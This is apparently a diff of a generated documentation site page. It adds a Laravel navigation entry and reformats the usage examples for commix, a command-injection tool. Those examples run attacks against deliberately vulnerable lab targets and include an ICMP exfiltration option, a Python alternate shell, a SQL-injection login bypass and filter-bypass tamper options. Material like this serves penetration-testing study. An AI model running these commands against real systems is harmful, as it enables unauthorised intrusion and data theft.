@@ -1103,6 +1103,72 @@
 
               
             
+              
+                
+  
+  
+  
+  
+    
+    
+    
+    
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+        
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_3_9_4" >
+        
+          
+          <label class="md-nav__link" for="__nav_3_9_4" id="__nav_3_9_4_label" tabindex="0">
+            
+  
+  <span class="md-ellipsis">
+    Common Framework Vuln
+  </span>
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_3_9_4_label" aria-expanded="false">
+          <label class="md-nav__title" for="__nav_3_9_4">
+            <span class="md-nav__icon md-icon"></span>
+            Common Framework Vuln
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../cybersecurity/bug_hunter/laravel/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    Laravel
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
           </ul>
         </nav>
       
@@ -8804,54 +8870,54 @@
 </ul>
 <h2 id="usage-examples">Usage Examples<a class="headerlink" href="#usage-examples" title="Permanent link">&para;</a></h2>
 <h4 id="1-exploiting-damn-vulnerable-web-app">1. Exploiting <a href="http://www.dvwa.co.uk/">Damn Vulnerable Web App</a>:<a class="headerlink" href="#1-exploiting-damn-vulnerable-web-app" title="Permanent link">&para;</a></h4>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>root@kali:~/commix#<span class="w"> </span>python<span class="w"> </span>commix.py<span class="w"> </span>--url<span class="o">=</span><span class="s2">&quot;http://192.168.178.58/DVWA-1.0.8/vulnerabilities/exec/#&quot;</span><span class="w"> </span>--data<span class="o">=</span><span class="s2">&quot;ip=127.0.0.1&amp;Submit=submit&quot;</span><span class="w"> </span>--cookie<span class="o">=</span><span class="s2">&quot;security=medium; PHPSESSID=nq30op434117mo7o2oe5bl7is4&quot;</span>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>root@kali:~/commix# python commix.py --url<span class="o">=</span><span class="s2">&quot;http://192.168.178.58/DVWA-1.0.8/vulnerabilities/exec/#&quot;</span> --data<span class="o">=</span><span class="s2">&quot;ip=127.0.0.1&amp;Submit=submit&quot;</span> --cookie<span class="o">=</span><span class="s2">&quot;security=medium; PHPSESSID=nq30op434117mo7o2oe5bl7is4&quot;</span>
 </code></pre></div>
 <h4 id="2-exploiting-php-charts-10-using-injection-payload-suffix-prefix-string">2. Exploiting <a href="http://www.exploit-db.com/exploits/25496/">php-Charts 1.0</a> using injection payload suffix &amp; prefix string:<a class="headerlink" href="#2-exploiting-php-charts-10-using-injection-payload-suffix-prefix-string" title="Permanent link">&para;</a></h4>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>root@kali:~/commix#<span class="w"> </span>python<span class="w"> </span>commix.py<span class="w"> </span>--url<span class="o">=</span><span class="s2">&quot;http://192.168.178.55/php-charts_v1.0/wizard/index.php?type=test&quot;</span><span class="w"> </span>--prefix<span class="o">=</span><span class="s2">&quot;&#39;&quot;</span><span class="w"> </span>--suffix<span class="o">=</span><span class="s2">&quot;//&quot;</span>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>root@kali:~/commix# python commix.py --url<span class="o">=</span><span class="s2">&quot;http://192.168.178.55/php-charts_v1.0/wizard/index.php?type=test&quot;</span> --prefix<span class="o">=</span><span class="s2">&quot;&#39;&quot;</span> --suffix<span class="o">=</span><span class="s2">&quot;//&quot;</span>
 </code></pre></div>
 <h4 id="3-exploiting-owasp-mutillidae-using-extra-headers-and-http-proxy">3. Exploiting <a href="https://www.owasp.org/index.php/Category:OWASP_Mutillidae">OWASP Mutillidae</a> using extra headers and HTTP proxy:<a class="headerlink" href="#3-exploiting-owasp-mutillidae-using-extra-headers-and-http-proxy" title="Permanent link">&para;</a></h4>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>root@kali:~/commix#<span class="w"> </span>python<span class="w"> </span>commix.py<span class="w"> </span>--url<span class="o">=</span><span class="s2">&quot;http://192.168.178.46/mutillidae/index.php?popUpNotificationCode=SL5&amp;page=dns-lookup.php&quot;</span><span class="w"> </span>--data<span class="o">=</span><span class="s2">&quot;target_host=127.0.0.1&quot;</span><span class="w"> </span>--headers<span class="o">=</span><span class="s2">&quot;Accept-Language:fr\nETag:123\n&quot;</span><span class="w"> </span>--proxy<span class="o">=</span><span class="s2">&quot;127.0.0.1:8081&quot;</span>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>root@kali:~/commix# python commix.py --url<span class="o">=</span><span class="s2">&quot;http://192.168.178.46/mutillidae/index.php?popUpNotificationCode=SL5&amp;page=dns-lookup.php&quot;</span> --data<span class="o">=</span><span class="s2">&quot;target_host=127.0.0.1&quot;</span> --headers<span class="o">=</span><span class="s2">&quot;Accept-Language:fr\nETag:123\n&quot;</span> --proxy<span class="o">=</span><span class="s2">&quot;127.0.0.1:8081&quot;</span>
 </code></pre></div>
 <h4 id="4-exploiting-persistence">4. Exploiting <a href="https://www.vulnhub.com/entry/persistence-1,103/">Persistence</a>:<a class="headerlink" href="#4-exploiting-persistence" title="Permanent link">&para;</a></h4>
 <ol>
 <li>Using ICMP exfiltration technique:</li>
 </ol>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>root@kali:~/commix#<span class="w"> </span>python<span class="w"> </span>commix.py<span class="w"> </span>--url<span class="o">=</span><span class="s2">&quot;http://192.168.178.8/debug.php&quot;</span><span class="w"> </span>--data<span class="o">=</span><span class="s2">&quot;addr=127.0.0.1&quot;</span><span class="w"> </span>--icmp-exfil<span class="o">=</span><span class="s2">&quot;ip_src=192.168.178.5,ip_dst=192.168.178.8&quot;</span>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>root@kali:~/commix# python commix.py --url<span class="o">=</span><span class="s2">&quot;http://192.168.178.8/debug.php&quot;</span> --data<span class="o">=</span><span class="s2">&quot;addr=127.0.0.1&quot;</span> --icmp-exfil<span class="o">=</span><span class="s2">&quot;ip_src=192.168.178.5,ip_dst=192.168.178.8&quot;</span>
 </code></pre></div>
 <ol>
 <li>Using an alternative (python) shell:</li>
 </ol>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>root@kali:~/commix#<span class="w"> </span>python<span class="w"> </span>commix.py<span class="w"> </span>--url<span class="o">=</span><span class="s2">&quot;http://192.168.178.8/debug.php&quot;</span><span class="w"> </span>--data<span class="o">=</span><span class="s2">&quot;addr=127.0.0.1&quot;</span><span class="w"> </span>--alter-shell<span class="o">=</span><span class="s2">&quot;Python&quot;</span>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>root@kali:~/commix# python commix.py --url<span class="o">=</span><span class="s2">&quot;http://192.168.178.8/debug.php&quot;</span> --data<span class="o">=</span><span class="s2">&quot;addr=127.0.0.1&quot;</span> --alter-shell<span class="o">=</span><span class="s2">&quot;Python&quot;</span>
 </code></pre></div>
 <h4 id="5-exploiting-damn-vulnerable-nodejs-application-dvna">5. Exploiting <a href="https://github.com/appsecco/dvna">Damn Vulnerable NodeJS Application (DVNA)</a>:<a class="headerlink" href="#5-exploiting-damn-vulnerable-nodejs-application-dvna" title="Permanent link">&para;</a></h4>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>root@kali:~/commix#<span class="w"> </span>python<span class="w"> </span>commix.py<span class="w"> </span>--url<span class="w"> </span><span class="s2">&quot;http://127.0.0.1:9090/app/ping&quot;</span><span class="w"> </span>--data<span class="w"> </span><span class="s2">&quot;address=127.0.0.1&quot;</span><span class="w"> </span>--cookie<span class="o">=</span><span class="s2">&quot;connect.sid=s%3AIdvte5ieuGQC5C8jt5aSyUTSF8xZtls8.3fwCVsyypx%2BLGXtiF1JTBrqbmjp%2B29vwKoL0uxcHub8&quot;</span><span class="w"> </span>-v1
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>root@kali:~/commix# python commix.py --url <span class="s2">&quot;http://127.0.0.1:9090/app/ping&quot;</span> --data <span class="s2">&quot;address=127.0.0.1&quot;</span> --cookie<span class="o">=</span><span class="s2">&quot;connect.sid=s%3AIdvte5ieuGQC5C8jt5aSyUTSF8xZtls8.3fwCVsyypx%2BLGXtiF1JTBrqbmjp%2B29vwKoL0uxcHub8&quot;</span> -v1
 </code></pre></div>
 <h4 id="6-exploiting-kioptrix-level-11-2">6. Exploiting <a href="http://www.kioptrix.com/dlvm/Kioptrix_Level_2.rar">Kioptrix: Level 1.1 (#2)</a>:<a class="headerlink" href="#6-exploiting-kioptrix-level-11-2" title="Permanent link">&para;</a></h4>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>root@kali:~/commix#<span class="w"> </span>python<span class="w"> </span>commix.py<span class="w"> </span>--url<span class="o">=</span><span class="s2">&quot;http://192.168.178.2/pingit.php&quot;</span><span class="w"> </span>--data<span class="o">=</span><span class="s2">&quot;ip=127.0.0.1E&amp;submit=submit&quot;</span><span class="w"> </span>--auth-url<span class="o">=</span><span class="s2">&quot;http://192.168.178.2/index.php&quot;</span><span class="w"> </span>--auth-data<span class="o">=</span><span class="s2">&quot;uname=admin&amp;psw=%27+OR+1%3D1--+-&amp;btnLogin=Login&quot;</span>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>root@kali:~/commix# python commix.py --url<span class="o">=</span><span class="s2">&quot;http://192.168.178.2/pingit.php&quot;</span> --data<span class="o">=</span><span class="s2">&quot;ip=127.0.0.1E&amp;submit=submit&quot;</span> --auth-url<span class="o">=</span><span class="s2">&quot;http://192.168.178.2/index.php&quot;</span> --auth-data<span class="o">=</span><span class="s2">&quot;uname=admin&amp;psw=%27+OR+1%3D1--+-&amp;btnLogin=Login&quot;</span>
 </code></pre></div>
 <h4 id="7-exploiting-kioptrix-2014-5-using-custom-user-agent-and-specified-injection-technique">7. Exploiting <a href="https://www.vulnhub.com/entry/kioptrix-2014-5,62/">Kioptrix: 2014 (#5)</a> using custom user-agent and specified injection technique:<a class="headerlink" href="#7-exploiting-kioptrix-2014-5-using-custom-user-agent-and-specified-injection-technique" title="Permanent link">&para;</a></h4>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>root@kali:~/commix#<span class="w"> </span>python<span class="w"> </span>commix.py<span class="w"> </span>--url<span class="o">=</span><span class="s2">&quot;http://192.168.178.6:8080/phptax/drawimage.php?pfilez=127.0.0.1&amp;pdf=make&quot;</span><span class="w"> </span>--user-agent<span class="o">=</span><span class="s2">&quot;Mozilla/4.0 Mozilla4_browser&quot;</span><span class="w"> </span>--technique<span class="o">=</span><span class="s2">&quot;f&quot;</span><span class="w"> </span>--root-dir<span class="o">=</span><span class="s2">&quot;/&quot;</span>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>root@kali:~/commix# python commix.py --url<span class="o">=</span><span class="s2">&quot;http://192.168.178.6:8080/phptax/drawimage.php?pfilez=127.0.0.1&amp;pdf=make&quot;</span> --user-agent<span class="o">=</span><span class="s2">&quot;Mozilla/4.0 Mozilla4_browser&quot;</span> --technique<span class="o">=</span><span class="s2">&quot;f&quot;</span> --root-dir<span class="o">=</span><span class="s2">&quot;/&quot;</span>
 </code></pre></div>
 <h4 id="8-exploiting-cve-2014-6271shellshock">8. Exploiting <a href="https://pentesterlab.com/exercises/cve-2014-6271">CVE-2014-6271/Shellshock</a>:<a class="headerlink" href="#8-exploiting-cve-2014-6271shellshock" title="Permanent link">&para;</a></h4>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>root@kali:~/commix#<span class="w"> </span>python<span class="w"> </span>commix.py<span class="w"> </span>--url<span class="o">=</span><span class="s2">&quot;http://192.168.178.4/cgi-bin/status/&quot;</span><span class="w"> </span>--shellshock
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>root@kali:~/commix# python commix.py --url<span class="o">=</span><span class="s2">&quot;http://192.168.178.4/cgi-bin/status/&quot;</span> --shellshock
 </code></pre></div>
 <h4 id="9-exploiting-commix-testbed-cookie-using-cookie-based-injection">9. Exploiting <a href="https://github.com/stasinopoulos/commix-testbed/tree/master/cookie">commix-testbed (cookie)</a> using cookie-based injection:<a class="headerlink" href="#9-exploiting-commix-testbed-cookie-using-cookie-based-injection" title="Permanent link">&para;</a></h4>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>root@kali:~/commix#<span class="w"> </span>python<span class="w"> </span>commix.py<span class="w"> </span>--url<span class="o">=</span><span class="s2">&quot;http://192.168.2.8/commix-testbed/scenarios/cookie/cookie(blind).php&quot;</span><span class="w"> </span>--cookie<span class="o">=</span><span class="s2">&quot;addr=127.0.0.1&quot;</span>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>root@kali:~/commix# python commix.py --url<span class="o">=</span><span class="s2">&quot;http://192.168.2.8/commix-testbed/scenarios/cookie/cookie(blind).php&quot;</span> --cookie<span class="o">=</span><span class="s2">&quot;addr=127.0.0.1&quot;</span>
 </code></pre></div>
 <h4 id="10-exploiting-commix-testbed-user-agent-using-ua-based-injection">10. Exploiting <a href="https://github.com/stasinopoulos/commix-testbed/tree/master/user-agent">commix-testbed (user-agent)</a> using ua-based injection:<a class="headerlink" href="#10-exploiting-commix-testbed-user-agent-using-ua-based-injection" title="Permanent link">&para;</a></h4>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>root@kali:~/commix#<span class="w"> </span>python<span class="w"> </span>commix.py<span class="w"> </span>--url<span class="o">=</span><span class="s2">&quot;http://192.168.2.4/commix-testbed/scenarios/user-agent/ua(blind).php&quot;</span><span class="w"> </span>--level<span class="o">=</span><span class="m">3</span>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>root@kali:~/commix# python commix.py --url<span class="o">=</span><span class="s2">&quot;http://192.168.2.4/commix-testbed/scenarios/user-agent/ua(blind).php&quot;</span> --level<span class="o">=</span><span class="m">3</span>
 </code></pre></div>
 <h4 id="11-exploiting-commix-testbed-referer-using-referer-based-injection">11. Exploiting <a href="https://github.com/stasinopoulos/commix-testbed/tree/master/referer">commix-testbed (referer)</a> using referer-based injection:<a class="headerlink" href="#11-exploiting-commix-testbed-referer-using-referer-based-injection" title="Permanent link">&para;</a></h4>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>root@kali:~/commix#<span class="w"> </span>python<span class="w"> </span>commix.py<span class="w"> </span>--url<span class="o">=</span><span class="s2">&quot;http://192.168.2.4/commix-testbed/scenarios/referer/referer(classic).php&quot;</span><span class="w"> </span>--level<span class="o">=</span><span class="m">3</span>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>root@kali:~/commix# python commix.py --url<span class="o">=</span><span class="s2">&quot;http://192.168.2.4/commix-testbed/scenarios/referer/referer(classic).php&quot;</span> --level<span class="o">=</span><span class="m">3</span>
 </code></pre></div>
 <h4 id="12-exploiting-flick-2-using-custom-headers-and-base64-encoding-option">12. Exploiting <a href="https://www.vulnhub.com/entry/flick-2,122/">Flick 2</a> using custom headers and base64 encoding option:<a class="headerlink" href="#12-exploiting-flick-2-using-custom-headers-and-base64-encoding-option" title="Permanent link">&para;</a></h4>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>root@kali:~/commix#<span class="w"> </span>python<span class="w"> </span>commix.py<span class="w"> </span>--url<span class="o">=</span><span class="s2">&quot;https://192.168.2.12/do/cmd/*&quot;</span><span class="w"> </span>--headers<span class="o">=</span><span class="s2">&quot;X-UUID:commix\nX-Token:dTGzPdMJlOoR3CqZJy7oX9JU72pvwNEF&quot;</span><span class="w"> </span>--base64
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>root@kali:~/commix# python commix.py --url<span class="o">=</span><span class="s2">&quot;https://192.168.2.12/do/cmd/*&quot;</span> --headers<span class="o">=</span><span class="s2">&quot;X-UUID:commix\nX-Token:dTGzPdMJlOoR3CqZJy7oX9JU72pvwNEF&quot;</span> --base64
 </code></pre></div>
 <h4 id="13-exploiting-commix-testbed-json-based-using-json-post-data">13. Exploiting <a href="https://github.com/stasinopoulos/commix-testbed/tree/master/scenarios/regular/POST">commix-testbed (JSON-based)</a> using JSON POST data:<a class="headerlink" href="#13-exploiting-commix-testbed-json-based-using-json-post-data" title="Permanent link">&para;</a></h4>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>root@kali:~/commix#<span class="w"> </span>python<span class="w"> </span>commix.py<span class="w"> </span>--url<span class="o">=</span><span class="s2">&quot;http://192.168.2.11/commix-testbed/scenarios/regular/POST/classic_json.php&quot;</span><span class="w"> </span>--data<span class="o">=</span><span class="s1">&#39;{&quot;addr&quot;:&quot;127.0.0.1&quot;,&quot;name&quot;:&quot;ancst&quot;}&#39;</span>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>root@kali:~/commix# python commix.py --url<span class="o">=</span><span class="s2">&quot;http://192.168.2.11/commix-testbed/scenarios/regular/POST/classic_json.php&quot;</span> --data<span class="o">=</span><span class="s1">&#39;{&quot;addr&quot;:&quot;127.0.0.1&quot;,&quot;name&quot;:&quot;ancst&quot;}&#39;</span>
 </code></pre></div>
 <h4 id="14-exploiting-sickos-11-using-shellshock-module-and-http-proxy">14. Exploiting <a href="https://www.vulnhub.com/entry/sickos-11,132/">SickOs 1.1</a> using shellshock module and HTTP proxy:<a class="headerlink" href="#14-exploiting-sickos-11-using-shellshock-module-and-http-proxy" title="Permanent link">&para;</a></h4>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>root@kali:~/commix#<span class="w"> </span>python<span class="w"> </span>commix.py<span class="w"> </span>--url<span class="o">=</span><span class="s2">&quot;http://192.168.2.8/cgi-bin/status&quot;</span><span class="w"> </span>--shellshock<span class="w"> </span>--proxy<span class="o">=</span><span class="s2">&quot;192.168.2.8:3128&quot;</span>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>root@kali:~/commix# python commix.py --url<span class="o">=</span><span class="s2">&quot;http://192.168.2.8/cgi-bin/status&quot;</span> --shellshock --proxy<span class="o">=</span><span class="s2">&quot;192.168.2.8:3128&quot;</span>
 </code></pre></div>
 <hr />
 <h2 id="filters-bypasses">Filters Bypasses<a class="headerlink" href="#filters-bypasses" title="Permanent link">&para;</a></h2>
@@ -8859,62 +8925,62 @@
 <ol>
 <li><em>Filter <a href="https://github.com/stasinopoulos/commix-testbed/blob/master/scenarios/filters/lax_domain_name.php">lax_domain_name.php</a> bypass:</em></li>
 </ol>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>python<span class="w"> </span>commix.py<span class="w"> </span>--url<span class="o">=</span><span class="s2">&quot;http://127.0.0.1/scenarios/filters/lax_domain_name.php&quot;</span><span class="w"> </span>--data<span class="o">=</span><span class="s2">&quot;addr=127.0.0.1&quot;</span><span class="w"> </span>--prefix<span class="o">=</span><span class="s2">&quot;a.b.c&quot;</span><span class="w"> </span>--suffix<span class="o">=</span><span class="s2">&quot;d.e.f&quot;</span>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>python commix.py --url<span class="o">=</span><span class="s2">&quot;http://127.0.0.1/scenarios/filters/lax_domain_name.php&quot;</span> --data<span class="o">=</span><span class="s2">&quot;addr=127.0.0.1&quot;</span> --prefix<span class="o">=</span><span class="s2">&quot;a.b.c&quot;</span> --suffix<span class="o">=</span><span class="s2">&quot;d.e.f&quot;</span>
 </code></pre></div>
 <ol>
 <li><em>Filter <a href="https://github.com/stasinopoulos/commix-testbed/blob/master/scenarios/filters/nested_quotes.php">nested_quotes.php</a> bypass:</em></li>
 </ol>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>python<span class="w"> </span>commix.py<span class="w"> </span>--url<span class="o">=</span><span class="s2">&quot;http://127.0.0.1/scenarios/filters/nested_quotes.php&quot;</span><span class="w"> </span>--data<span class="o">=</span><span class="s2">&quot;addr=127.0.0.1&quot;</span><span class="w"> </span>--prefix<span class="o">=</span><span class="s2">&quot;\&quot;&quot;</span><span class="w"> </span>--suffix<span class="o">=</span><span class="s2">&quot;\&quot;&quot;</span>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>python commix.py --url<span class="o">=</span><span class="s2">&quot;http://127.0.0.1/scenarios/filters/nested_quotes.php&quot;</span> --data<span class="o">=</span><span class="s2">&quot;addr=127.0.0.1&quot;</span> --prefix<span class="o">=</span><span class="s2">&quot;\&quot;&quot;</span> --suffix<span class="o">=</span><span class="s2">&quot;\&quot;&quot;</span>
 </code></pre></div>
 <ol>
 <li><em>Filter <a href="https://github.com/stasinopoulos/commix-testbed/blob/master/scenarios/filters/no_space.php">no_space.php</a> bypass:</em></li>
 </ol>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>python<span class="w"> </span>commix.py<span class="w"> </span>--url<span class="o">=</span><span class="s2">&quot;http://127.0.0.1/scenarios/filters/no_space.php&quot;</span><span class="w"> </span>--data<span class="o">=</span><span class="s2">&quot;addr=127.0.0.1&quot;</span><span class="w"> </span>--tamper<span class="o">=</span><span class="s2">&quot;space2ifs&quot;</span>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>python commix.py --url<span class="o">=</span><span class="s2">&quot;http://127.0.0.1/scenarios/filters/no_space.php&quot;</span> --data<span class="o">=</span><span class="s2">&quot;addr=127.0.0.1&quot;</span> --tamper<span class="o">=</span><span class="s2">&quot;space2ifs&quot;</span>
 </code></pre></div>
 <ol>
 <li><em>Filter <a href="https://github.com/stasinopoulos/commix-testbed/blob/master/scenarios/filters/no_space_no_colon_no_pipe_no_ampersand.php">no_space_no_colon_no_pipe_no_ampersand.php</a> bypass:</em></li>
 </ol>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>python<span class="w"> </span>commix.py<span class="w"> </span>--url<span class="o">=</span><span class="s2">&quot;http://127.0.0.1/scenarios/filters/no_colon_no_pipe_no_ampersand_no_dollar.php&quot;</span><span class="w"> </span>--data<span class="o">=</span><span class="s2">&quot;addr=127.0.0.1&quot;</span><span class="w"> </span>--technique<span class="o">=</span>f<span class="w"> </span>--web-root<span class="o">=</span><span class="s2">&quot;/var/www/commix-testbed.com/public_html/&quot;</span><span class="w"> </span>--tamper<span class="o">=</span><span class="s2">&quot;space2htab&quot;</span>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>python commix.py --url<span class="o">=</span><span class="s2">&quot;http://127.0.0.1/scenarios/filters/no_colon_no_pipe_no_ampersand_no_dollar.php&quot;</span> --data<span class="o">=</span><span class="s2">&quot;addr=127.0.0.1&quot;</span> --technique<span class="o">=</span>f --web-root<span class="o">=</span><span class="s2">&quot;/var/www/commix-testbed.com/public_html/&quot;</span> --tamper<span class="o">=</span><span class="s2">&quot;space2htab&quot;</span>
 </code></pre></div>
 <ol>
 <li><em>Filter <a href="https://github.com/stasinopoulos/commix-testbed/blob/master/scenarios/filters/no_space_no_colon_no_pipe_no_ampersand_no_dollar.php">no_space_no_colon_no_pipe_no_ampersand_no_dollar.php</a> bypass:</em></li>
 </ol>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>python<span class="w"> </span>commix.py<span class="w"> </span>--url<span class="o">=</span><span class="s2">&quot;http://127.0.0.1/scenarios/filters/no_space_no_colon_no_pipe_no_ampersand_no_dollar.php&quot;</span><span class="w"> </span>--data<span class="o">=</span><span class="s2">&quot;addr=127.0.0.1&quot;</span><span class="w"> </span>--technique<span class="o">=</span>f<span class="w"> </span>--web-root<span class="o">=</span><span class="s2">&quot;/var/www/commix-testbed.com/public_html/&quot;</span><span class="w"> </span>--tamper<span class="o">=</span><span class="s2">&quot;space2htab&quot;</span>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a>python commix.py --url<span class="o">=</span><span class="s2">&quot;http://127.0.0.1/scenarios/filters/no_space_no_colon_no_pipe_no_ampersand_no_dollar.php&quot;</span> --data<span class="o">=</span><span class="s2">&quot;addr=127.0.0.1&quot;</span> --technique<span class="o">=</span>f --web-root<span class="o">=</span><span class="s2">&quot;/var/www/commix-testbed.com/public_html/&quot;</span> --tamper<span class="o">=</span><span class="s2">&quot;space2htab&quot;</span>
 </code></pre></div>
 <ol>
 <li><em>Filter <a href="https://github.com/stasinopoulos/commix-testbed/blob/master/scenarios/filters/no_colon_no_pipe_no_ampersand_no_dollar.php">no_colon_no_pipe_no_ampersand_no_dollar.php</a> bypass:</em></li>
 </ol>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>python<span class="w"> </span>commix.py<span class="w"> </span>--url<span class="o">=</span><span class="s2">&quot;http://127.0.0.1/scenarios/filters/no_colon_no_pipe_no_ampersand_no_dollar.php&quot;</span><span class="w"> </span>--data<span class="o">=</span><span class="s2">&quot;addr=127.0.0.1&quot;</span>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>python commix.py --url<span class="o">=</span><span class="s2">&quot;http://127.0.0.1/scenarios/filters/no_colon_no_pipe_no_ampersand_no_dollar.php&quot;</span> --data<span class="o">=</span><span class="s2">&quot;addr=127.0.0.1&quot;</span>
 </code></pre></div>
 <ol>
 <li><em>Filter <a href="https://github.com/stasinopoulos/commix-testbed/blob/master/scenarios/filters/no_white_chars.php">no_white_chars.php</a> bypass:</em></li>
 </ol>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>python<span class="w"> </span>commix.py<span class="w"> </span>--url<span class="o">=</span><span class="s2">&quot;http://127.0.0.1/scenarios/filters/no_white_chars.php&quot;</span><span class="w"> </span>--data<span class="o">=</span><span class="s2">&quot;addr=127.0.0.1&quot;</span><span class="w"> </span>--tamper<span class="o">=</span><span class="s2">&quot;space2ifs&quot;</span>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>python commix.py --url<span class="o">=</span><span class="s2">&quot;http://127.0.0.1/scenarios/filters/no_white_chars.php&quot;</span> --data<span class="o">=</span><span class="s2">&quot;addr=127.0.0.1&quot;</span> --tamper<span class="o">=</span><span class="s2">&quot;space2ifs&quot;</span>
 </code></pre></div>
 <ol>
 <li><em>Filter <a href="https://github.com/stasinopoulos/commix-testbed/blob/master/scenarios/filters/no_white_chars_start_alphanum.php">no_white_chars_start_alphanum.php</a> bypass:</em></li>
 </ol>
-<div class="highlight"><pre><span></span><code><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>python<span class="w"> </span>commix.py<span class="w"> </span>--url<span class="o">=</span><span class="s2">&quot;http://127.0.0.1/scenarios/filters/no_white_chars_start_alphanum.php&quot;</span><span class="w"> </span>--data<span class="o">=</span><span class="s2">&quot;addr=127.0.0.1&quot;</span><span class="w"> </span>--tamper<span class="o">=</span><span class="s2">&quot;space2ifs&quot;</span><span class="w"> </span>--prefix<span class="o">=</span><span class="s2">&quot;abc&quot;</span>
